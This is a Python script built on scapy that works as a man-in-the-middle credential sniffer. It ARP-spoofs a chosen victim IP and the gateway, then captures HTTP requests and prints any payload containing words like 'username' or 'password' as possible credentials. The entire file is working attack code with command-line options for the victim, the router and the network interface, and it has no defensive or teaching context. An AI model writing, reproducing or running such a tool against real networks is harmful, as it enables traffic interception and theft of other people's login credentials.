import argparse
import scapy.all as scapy
from scapy.layers import http
import time
import signal
import sys

# Function to print text in color using color codes
def print_colored_text(text, color_code):
    print(f"\033[{color_code}m" + text + "\033[0m")

# Set to track seen HTTP requests
seen_requests = set()

# Function to capture and analyze packets
def process_packet(packet):
    try:
        # Check if the packet contains an HTTP request
        if packet.haslayer(http.HTTPRequest):
            host = packet[http.HTTPRequest].Host.decode('utf-8', errors='ignore')
            path = packet[http.HTTPRequest].Path.decode('utf-8', errors='ignore')
            
            # Create a unique identifier for the HTTP request (Host + Path)
            request_id = f"{host}{path}"
            
            # Check if this request has been processed before
            if request_id in seen_requests:
                return  # Skip this packet if it's a duplicate
            else:
                seen_requests.add(request_id)
            
            # Print the Host and Path in yellow
            print_colored_text(f'[+] Host: {host}    Path: {path}', '33')

            # Check if the packet contains raw data which may contain login credentials
            if packet.haslayer(scapy.Raw):   
                load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                keywords = ['username', 'user', 'login', 'password', 'pass']
                
                for keyword in keywords:
                    if keyword in load:
                        # Print login credentials in green
                        print_colored_text(f'[+][+] Possible Credentials: {load}', '32')
                        break

    except Exception as e:
        # Handle errors
        print_colored_text(f'[!] Error processing packet: {e}', '31')

# Function to perform ARP Spoofing
def scan_network(ip):
    arp_request = scapy.ARP(pdst=ip)
    arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = arp_broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered:
        return answered[0][1].hwsrc
    else:
        print_colored_text(f"[!] Could not find MAC address for IP: {ip}", '31')
        return None

def spoof(target_ip, router_ip):
    target_mac = scan_network(target_ip)
    router_mac = scan_network(router_ip)

    if not target_mac or not router_mac:
        print_colored_text("[!] Could not find required MAC addresses. Aborting ARP spoofing.", '31')
        return

    # Send ARP packets to disrupt the connection
    arp_response = scapy.ARP(
        op=2, 
        pdst=target_ip, 
        hwdst=target_mac, 
        psrc=router_ip
    )
    scapy.send(arp_response, verbose=False)

# Function to start packet sniffing
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet, stop_filter=lambda x: False)

# Function to analyze user input
def arqument():
    parse = argparse.ArgumentParser()
    parse.add_argument('-t', '--target', dest='target_ip', help='Specify Victim IP address')
    parse.add_argument('-r', '--router', dest='router_ip', help='Specify Gateway IP address')
    parse.add_argument('-i', '--interface', dest='interface', help='Specify network interface for sniffing')

    variables = parse.parse_args()

    if not variables.target_ip:
        print_colored_text('[-] Please enter target IP Address', '31')  # Red for error
        parse.error('[-] Please enter target IP Address')

    if not variables.router_ip:
        print_colored_text('[-] Please enter Gateway IP Address', '31')  # Red for error
        parse.error('[-] Please enter Gateway IP Address')

    if not variables.interface:
        print_colored_text('[-] Please enter network interface for sniffing', '31')  # Red for error
        parse.error('[-] Please enter network interface for sniffing')

    return variables.target_ip, variables.router_ip, variables.interface

# Function to handle the stop signal (Ctrl+C)
def signal_handler(sig, frame):
    print("\n[+] Exiting gracefully...")
    sys.exit(0)

if __name__ == "__main__":
    target_ip, router_ip, interface = arqument()

    # Set signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)

    # Start ARP Spoofing in an infinite loop
    while True:
        print_colored_text("[+] Starting ARP Spoofing...", '32')  # Green for starting
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        time.sleep(2)

        # Start packet sniffing and analysis
        print_colored_text("[+] Starting packet sniffing...", '32')  # Green for starting sniffing
        sniff(interface)
